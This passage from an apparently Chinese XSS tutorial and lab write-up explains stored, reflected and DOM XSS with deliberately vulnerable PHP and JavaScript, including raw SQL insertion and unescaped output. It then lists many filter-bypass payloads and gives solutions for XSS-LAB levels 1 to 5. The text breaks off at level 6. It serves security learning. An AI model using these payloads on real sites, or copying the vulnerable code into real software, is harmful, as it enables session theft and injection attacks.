class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">      <span class="variable">$comment</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;comment&#x27;</span>];</span><br><span class="line">      <span class="comment">// 将评论存储到数据库中</span></span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO comments (content) VALUES (&#x27;<span class="subst">$comment</span>&#x27;)&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br><span class="line">  &lt;h2&gt;评论区&lt;/h2&gt;</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">      <span class="comment">// 显示所有评论</span></span><br><span class="line">      <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="string">&quot;SELECT * FROM comments&quot;</span>);</span><br><span class="line">      <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;li&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&#x27;content&#x27;</span>] . <span class="string">&quot;&lt;/li&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h5><blockquote><p>非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。</p><p>一般就是题目给一个<code>&lt;input&gt;</code>标签形成的输入框，然后我们在输入框里输入我们的恶意脚本，需要用户进行触发才能进行攻击，在前端输入恶意脚本，后端接受，然后再在前端显示，这也就是反射型XSS的数据流通。</p></blockquote><p>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">   &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span>&gt;</span><br><span class="line">   &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;提交&lt;/button&gt;</span><br><span class="line"> &lt;/form&gt;</span><br><span class="line"> &lt;p&gt;您好，<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]; <span class="meta">?&gt;</span>！&lt;/p&gt; </span><br></pre></td></tr></table></figure><h5 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h5><blockquote><p>不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。</p><p>这种XSS攻击是不经过后端的，它也算是一种反射型XSS，但是它的数据流通过程比较简单，就是在前端url添加我们的恶意脚本，然后直接在页面输出了</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> query = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> name = query.<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript">   <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;p&gt;Hello, &quot;</span> + name + <span class="string">&quot;!&lt;/p&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="JSONP-XSS"><a href="#JSONP-XSS" class="headerlink" title="JSONP XSS"></a>JSONP XSS</h5><p>参考文章：<a href="https://blog.csdn.net/tiancityycf/article/details/117675042">jsonp安全攻防技术（JSON劫持、XSS漏洞）_xss漏洞 json-CSDN博客</a></p><h3 id="XSS攻击点-插入点"><a href="#XSS攻击点-插入点" class="headerlink" title="XSS攻击点(插入点)"></a>XSS攻击点(插入点)</h3><h4 id="插入到HTML注释内容中"><a href="#插入到HTML注释内容中" class="headerlink" title="插入到HTML注释内容中"></a>插入到HTML注释内容中</h4><p>没见过，见过再补。</p><h4 id="插入到HTML标签属性值中"><a href="#插入到HTML标签属性值中" class="headerlink" title="插入到HTML标签属性值中"></a>插入到HTML标签属性值中</h4><p>示例：<code>&lt;img src=‘img.png’ onerror=“&lt;script&gt;alert(1)&lt;/script&gt;”&gt;</code></p><p>附：onerror属性值并不是简单的出现在网页上，而是会经过HTML和JavaScript语法。事实上，onerror是JavaScript的属性。</p><h4 id="插入到HTML标签属性名中"><a href="#插入到HTML标签属性名中" class="headerlink" title="插入到HTML标签属性名中"></a>插入到HTML标签属性名中</h4><p>没见过，见过再补。</p><h4 id="插入到HTML标签名中"><a href="#插入到HTML标签名中" class="headerlink" title="插入到HTML标签名中"></a>插入到HTML标签名中</h4><p>没见过，见过再补。</p><h4 id="插入到CSS中"><a href="#插入到CSS中" class="headerlink" title="插入到CSS中"></a>插入到CSS中</h4><p>示例：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=<span class="string">&quot;background-image:url(&#x27;javascript:alert(`Evi1s7`)&#x27;);&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="插入到HTTP响应中"><a href="#插入到HTTP响应中" class="headerlink" title="插入到HTTP响应中"></a>插入到HTTP响应中</h4><p>没见过，见过再补。</p><h3 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h3><h4 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h4><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p>示例(原理是第一点)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">      <span class="variable">$q</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      <span class="variable">$q</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$q</span>); </span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>以下是一些可能导致大小写绕过的情况和原理：</p><ol><li><strong>标签和属性名不区分大小写：</strong><ul><li>在HTML中，标签名和属性名是不区分大小写的。例如，<code>&lt;script&gt;</code> 和 <code>&lt;SCRIPT&gt;</code> 是等效的。攻击者可能会尝试使用不同大小写的标签和属性名，以绕过一些基于规则的过滤器。</li></ul></li><li><strong>JavaScript事件处理属性不区分大小写：</strong><ul><li>在HTML中，JavaScript事件处理属性（如<code>onclick</code>、<code>onmouseover</code>等）也是不区分大小写的。攻击者可以尝试使用大小写变体来绕过一些检测。</li></ul></li><li><strong>HTML实体编码绕过：</strong><ul><li>攻击者有时会使用HTML实体编码来混淆代码，以尝试绕过安全过滤。大小写变体可能会用于混淆这些实体编码，使其更难以识别。</li></ul></li><li><strong>混合大小写的JavaScript：</strong><ul><li>在JavaScript中，变量和函数名是区分大小写的，但攻击者可能尝试使用混合大小写的形式，使其更难以检测。</li></ul></li></ol></blockquote><h5 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h5><h6 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a>eval()函数</h6><p>函数解析</p><p>在 JavaScript 中，<code>eval()</code> 函数用于执行传递给它的字符串中的 JavaScript 代码。</p><p>语法：eval(codeString)</p><p>示例：</p><p><code>var x = 10;</code><br><code>var y = 20;</code><br><code>var codeString = &quot;x + y&quot;;</code><br><code>var result = eval(codeString);</code><br><code>console.log(result); // 输出 30</code></p><p>把eval的参数字符串当成运行代码即可</p><p>绕过示例</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;x&quot;</span> <span class="attribute">onerror</span>=<span class="string">&quot;eval(&#x27;al&#x27;+&#x27;ert(Evi1s7)&#x27;)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h6 id="window"><a href="#window" class="headerlink" title="window"></a>window</h6><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;x&quot;</span> <span class="attribute">onerror</span>=<span class="string">&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><blockquote><p>这段代码中 <code>window[&#39;alert&#39;](1)</code> 是使用 JavaScript 中的数组标记法（Array Bracket Notation）来调用 <code>window</code> 对象的 <code>alert</code> 方法。</p><p>在 JavaScript 中，<code>window</code> 是全局对象，而 <code>alert</code> 是 <code>window</code> 对象的一个方法，用于在浏览器中显示一个警告框，通常用于向用户显示一条消息。</p><p>在这里，<code>window[&#39;alert&#39;](1)</code> 实际上等同于 <code>window.alert(1)</code>。这行代码的作用是在浏览器中弹出一个警告框，显示数字 1。然而，需要注意的是，这样的代码常常被用于恶意目的，尤其是在尝试进行跨站脚本（XSS）攻击时，因此在实际开发中应该小心处理用户输入，以防止安全漏洞。</p></blockquote><p>其它与之类似的还有top，frame，window，self，parent等等。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;x&quot;</span> <span class="attribute">onerror</span>=<span class="string">&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](Evi1s7)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;self[`al`+`ert`](1)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;parent[`al`+`ert`](1)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;frames[`al`+`ert`](1)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h5 id="函数替换"><a href="#函数替换" class="headerlink" title="函数替换"></a>函数替换</h5><p>当一些函数被禁用时，可以替换为其他函数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;x&quot;</span> <span class="attribute">onerror</span>=<span class="string">&quot;eval(alert(1))&quot;</span>&gt;</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;x&quot;</span> <span class="attribute">onerror</span>=<span class="string">&quot;open(alert(1))&quot;</span>&gt;</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;x&quot;</span> <span class="attribute">onerror</span>=<span class="string">&quot;document.write(alert(1))&quot;</span>&gt;</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;x&quot;</span> <span class="attribute">onerror</span>=<span class="string">&quot;setTimeout(alert(1))&quot;</span>&gt;</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;x&quot;</span> <span class="attribute">onerror</span>=<span class="string">&quot;setInterval(alert(1))&quot;</span>&gt;</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;x&quot;</span> <span class="attribute">onerror</span>=<span class="string">&quot;Set.constructor(alert(1))&quot;</span>&gt;</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;x&quot;</span> <span class="attribute">onerror</span>=<span class="string">&quot;Map.constructor(alert(1))&quot;</span>&gt;</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;x&quot;</span> <span class="attribute">onerror</span>=<span class="string">&quot;Array.constructor(alert(1))&quot;</span>&gt;</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;x&quot;</span> <span class="attribute">onerror</span>=<span class="string">&quot;WeakSet.constructor(alert(1))&quot;</span>&gt;</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;x&quot;</span> <span class="attribute">onerror</span>=<span class="string">&quot;constructor.constructor(alert(1))&quot;</span>&gt;</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;x&quot;</span> <span class="attribute">onerror</span>=<span class="string">&quot;[1].map(alert(1))&quot;</span>&gt;</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;x&quot;</span> <span class="attribute">onerror</span>=<span class="string">&quot;[1].find(alert(1))&quot;</span>&gt;</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;x&quot;</span> <span class="attribute">onerror</span>=<span class="string">&quot;[1].every(alert(1))&quot;</span>&gt;</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;x&quot;</span> <span class="attribute">onerror</span>=<span class="string">&quot;[1].filter(alert(1))&quot;</span>&gt;</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;x&quot;</span> <span class="attribute">onerror</span>=<span class="string">&quot;[1].forEach(alert(1))&quot;</span>&gt;</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;x&quot;</span> <span class="attribute">onerror</span>=<span class="string">&quot;[1].findIndex(alert(1))&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h5 id="嵌套绕过-双写绕过"><a href="#嵌套绕过-双写绕过" class="headerlink" title="嵌套绕过(双写绕过)"></a>嵌套绕过(双写绕过)</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">ript&gt;<span class="title function_">alert</span>(<span class="string">&#x27;Evi1s7&#x27;</span>)&lt;/sc</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>ript&gt;</span><br></pre></td></tr></table></figure><p>没啥说的</p><h5 id="赋值绕过"><a href="#赋值绕过" class="headerlink" title="赋值绕过"></a>赋值绕过</h5><p>这个有点意思，用变量代替字符串，看例子：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src <span class="attribute">onerror</span>=_=alert,_(1)&gt;</span><br><span class="line">&lt;img src <span class="attribute">x</span>=al <span class="attribute">y</span>=ert <span class="attribute">onerror</span>=top[x+y](1)&gt;</span><br><span class="line">&lt;img src <span class="attribute">x</span>=al <span class="attribute">y</span>=ert <span class="attribute">onerror</span>=window[x+y](1)&gt; #在网页没有嵌套框架时才有效。</span><br><span class="line">&lt;img src <span class="attribute">onerror</span>=top[<span class="attribute">a</span>=<span class="string">&#x27;al&#x27;</span>,b=&#x27;ev&#x27;,b+a](<span class="string">&#x27;alert(1)&#x27;</span>)&gt;</span><br><span class="line">&lt;img src onerror=[<span class="string">&#x27;ale&#x27;</span>+<span class="string">&#x27;rt&#x27;</span>].map(top[<span class="string">&#x27;ev&#x27;</span>+<span class="string">&#x27;al&#x27;</span>])[0][<span class="string">&#x27;valu&#x27;</span>+<span class="string">&#x27;eOf&#x27;</span>]()(1)&gt;</span><br></pre></td></tr></table></figure><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><h5 id="HTML实体编码和Unicode编码"><a href="#HTML实体编码和Unicode编码" class="headerlink" title="HTML实体编码和Unicode编码"></a>HTML实体编码和Unicode编码</h5><p>原理：</p><p>1.JavaScript引擎会将DOM文档的实体编码解码为原始字符，所以有些字符可以用实体编码代替</p><p>2.在正常情况下，JavaScript 引擎会正确解释和执行 Unicode 编码的字符。例如，下面的 JavaScript 代码将正确输出 “你好”：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascriptCopy code</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;\u4F60\u597D&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h5><p>示例：<code>&lt;a href=javascript:%61%6c%65%72%74%28%31%29&gt;Evi1s7&lt;/a&gt;</code></p><p>原理：在 JavaScript 伪协议中，当使用 <code>javascript:</code> 开头的 URL，并且其中包含编码后的 JavaScript 代码时，浏览器在执行这个 URL 时，会先解码其中的百分号编码，然后再执行解码后的 JavaScript 代码。</p><h6 id="附：src和href的运用"><a href="#附：src和href的运用" class="headerlink" title="附：src和href的运用"></a>附：src和href的运用</h6><p>src：</p><p><code>&lt;script&gt;</code>标签</p><p><code>src</code>属性用于指定引入外部JavaScript文件的URL</p><p><code>&lt;img&gt;</code>标签</p><p><code>src</code>属性用于指定要显示的图像的URL</p><p><code>&lt;frame&gt;</code>标签</p><p><code>src</code>属性用于指定要嵌入的另一个文档的URL。</p><p><code>&lt;audio&gt;</code>和<code>&lt;video&gt;</code>标签</p><p><code>src</code>属性用于指定要播放的音频或视频的URL</p><p>href：</p><p><code>&lt;a&gt;</code>标签</p><p><code>href</code>属性用于指定链接目标的URL。</p><p><code>&lt;href&gt;</code>标签</p><p><code>href</code>属性用于指定外部样式表的URL。</p><p><code>&lt;base&gt;</code>标签</p><p><code>href</code>属性用于指定基准URL，所有相对URL都将以该URL为基础。</p><p><code>&lt;area&gt;</code>标签</p><p><code>href</code>属性用于指定图像地图中区域的URL。</p><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><blockquote><p>在html的标签中的不同位置的空格绕过方式不是一样的</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;html&gt;</span><span class="section">&lt;imgAAsrcAAonerrorBB=BBalertCC(1)DD&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>A位置： &#x2F;，&#x2F;123&#x2F;，%09，%0A，%0C，%0D，%20， &#x2F;**&#x2F;</p><p>B位置：%09，%0A，%0C，%0D，%20</p><p>C位置：%0B，&#x2F;**&#x2F; （如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20）</p><p>D位置：%09，%0A，%0C，%0D，%20，&#x2F;&#x2F;，&gt;</p></blockquote><h4 id="小括号-绕过"><a href="#小括号-绕过" class="headerlink" title="小括号()绕过"></a>小括号()绕过</h4><h5 id="利用反引号"><a href="#利用反引号" class="headerlink" title="利用反引号&#96;&#96;"></a>利用反引号&#96;&#96;</h5><p>示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="throw"><a href="#throw" class="headerlink" title="throw"></a>throw</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">alert;<span class="keyword">throw</span> <span class="number">1</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="单引号过滤"><a href="#单引号过滤" class="headerlink" title="单引号过滤"></a>单引号过滤</h4><h5 id="斜杠替换"><a href="#斜杠替换" class="headerlink" title="斜杠替换"></a>斜杠替换</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/Evi1s7/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="反引号替换"><a href="#反引号替换" class="headerlink" title="反引号替换"></a>反引号替换</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">`Evi1s7`</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="alert过滤"><a href="#alert过滤" class="headerlink" title="alert过滤"></a>alert过滤</h4><p>用其他函数替换</p><blockquote><p>prompt()</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">prompt</span>(<span class="string">&#x27;Evi1s7&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>confirm()</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&#x27;Evi1s7&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>console.log()</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Evi1s7&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>document.write()</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;Evi1s7&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>还可以利用编码绕过，JavaScript引擎会自动解码。</p><h4 id="分号绕过"><a href="#分号绕过" class="headerlink" title="分号绕过"></a>分号绕过</h4><p>当只过滤了分号时，可以利用花括号进行语句隔离</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><span class="template-variable">&#123;onerror=alert&#125;</span><span class="language-xml"><span class="language-javascript"><span class="keyword">throw</span> <span class="number">1</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h4><blockquote><p>可以利用拆分法</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">a=<span class="string">&#x27;document.write(&quot;&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">a=a+<span class="string">&#x27;&lt;a href=ht&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">a=a+<span class="string">&#x27;tp://VPS-IP:po&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">a=a+<span class="string">&#x27;rt&gt;Evi1s7&lt;/a&gt;&quot;)&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(a)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用eval()函数将字符串解析为可执行的代码，从而进行拼接</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(&quot;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">http://VPS-IP:port</span>&gt;</span>Evi1s7<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;)闯关</span><br></pre></td></tr></table></figure></blockquote><h2 id="XSS-LAB闯关"><a href="#XSS-LAB闯关" class="headerlink" title="XSS_LAB闯关"></a>XSS_LAB闯关</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>source：<code>echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</code></p><p>语句：</p><ol><li><p><code>&lt;img src=&quot;&quot; onerror=alert(233)&gt;</code></p></li><li><p><code>&lt;input onclick=alert(233)&gt;</code> </p></li><li><p><code>&lt;sccript&gt;alert(1)&lt;/script&gt;</code></p></li></ol><p>须知：第二种注入以后刚开始可能会报错，再点一下输入框即可。</p><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>source：</p><p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;</code></p><p><code>&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;</code></p><p>显然第一行的不可以，看看第二行。</p><p>语句：</p><ol><li><code>&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt;//</code></li><li><code>&quot; onclick=alert(1)&gt;//</code></li></ol><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>source：</p><p><code>&lt;input name=keyword  value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;</code></p><p>须知：</p><blockquote><p>使用htmlspecialchars()函数对输入进行了处理，该函数会将双引号、小于号、大于号、&amp;符号转换为对应的HTML实体编码，但默认情况下并不会对单引号进行编码</p></blockquote><p>语句：</p><p><code>&#39; onclick=alert(1)//</code></p><p>附：因为htmlspecialchars()函数，所以用不了闭合插入法（哈哈，自己编的）。</p><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>source：</p><p><code>$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</code></p><p><code>$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</code></p><p><code>&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;</code></p><p>由上可知大小于号又没了，只能用属性法了（没错，又是我自己编的）。</p><p>语句：</p><p><code>&quot; onclick=alert(1)//</code></p><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>source：</p><p><code>$str = strtolower($_GET[&quot;keyword&quot;]);</code></p><p><code>$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</code></p><p><code>$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</code></p><p><code>&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;</code></p><p>全部小写，再来两个替换。</p><p>语句：</p><p> <code>&quot;&gt;&lt;a href=javascript:alert(1)&gt;hi&lt;/a&gt;//</code></p><p>须知：</p><p>JavaScript伪协议：</p><p>伪协议不同于因特网上所真实存在的协议，而是为关联应用程序而使用的。</p><p>格式：javascript:······，通常在最后面加一句：void 0;</p><p>如果有多个语句需要用逗号分隔。</p><h3 id="Less-6"><a href="#Less-6" class="headerlink" 